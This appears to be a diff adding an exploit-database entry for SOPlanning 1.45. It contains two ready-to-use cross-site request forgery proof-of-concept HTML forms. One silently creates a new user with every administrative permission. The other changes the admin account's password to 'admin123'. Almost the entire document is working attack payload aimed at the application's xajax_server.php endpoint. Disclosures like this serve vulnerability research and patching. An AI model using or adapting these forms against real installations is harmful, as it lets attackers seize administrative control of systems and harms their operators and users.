@@ -1,0 +1,69 @@
+# Exploit Title: SOPlanning 1.45 - Cross-Site Request Forgery (Add User)
+# Date: 2020-02-14
+# Exploit Author: J3rryBl4nks
+# Vendor Homepage: https://www.soplanning.org/en/
+# Software Link: https://sourceforge.net/projects/soplanning/files/soplanning/
+# Version 1.45
+# Tested on Windows 10/Kali Rolling
+
+# The SoPlanning 1.45 application is vulnerable to CSRF that allows for arbitrary 
+# user creation and for changing passwords (Specifically the admin password)
+
+# POC For aribtrary user creation:
+# CSRF POC:
+
+
+<html>
+<body>
+<script>history.pushState('', '', '/')</script>
+<form action="http://10.22.6.208/soplanning/www/process/xajax_server.php" method="POST">
+<input type="hidden" name="xajax" value="submitFormUser" />
+<input type="hidden" name="xajaxr" value="1581700271752" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="Testing" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="1" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="Testing" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="test&#64;test&#46;com" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="Test" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="test" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="&#35;FFFFFF" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="false" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="false" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="<xjxobj><e><k>0<&#47;k><v>users&#95;manage&#95;all<&#47;v><&#47;e><e><k>1<&#47;k><v>projects&#95;manage&#95;all<&#47;v><&#47;e><e><k>2<&#47;k><v>projectgroups&#95;manage&#95;all<&#47;v><&#47;e><e><k>3<&#47;k><v>tasks&#95;modify&#95;all<&#47;v><&#47;e><e><k>4<&#47;k><v>tasks&#95;view&#95;all&#95;projects<&#47;v><&#47;e><e><k>5<&#47;k><v>tasks&#95;view&#95;all&#95;users<&#47;v><&#47;e><e><k>6<&#47;k><v>lieux&#95;all<&#47;v><&#47;e><e><k>7<&#47;k><v>ressources&#95;all<&#47;v><&#47;e><e><k>8<&#47;k><v>audit&#95;restore<&#47;v><&#47;e><e><k>9<&#47;k><v>parameters&#95;all<&#47;v><&#47;e><e><k>10<&#47;k><v>stats&#95;users<&#47;v><&#47;e><e><k>11<&#47;k><v>stats&#95;projects<&#47;v><&#47;e><&#47;xjxobj>" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="<xjxobj><&#47;xjxobj>" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
+
+# POC for admin password change:
+
+# CSRF POC:
+
+<html>
+<body>
+<script>history.pushState('', '', '/')</script>
+<form action="http://HOSTNAME/soplanning/www/process/xajax_server.php" method="POST">
+<input type="hidden" name="xajax" value="submitFormProfil" />
+<input type="hidden" name="xajaxr" value="1581702103306" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="ADM" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="test&#64;test&#46;com" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="admin123" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="fr" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="false" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="false" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
+<input type="hidden" name="xajaxargs&#91;&#93;" value="false" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
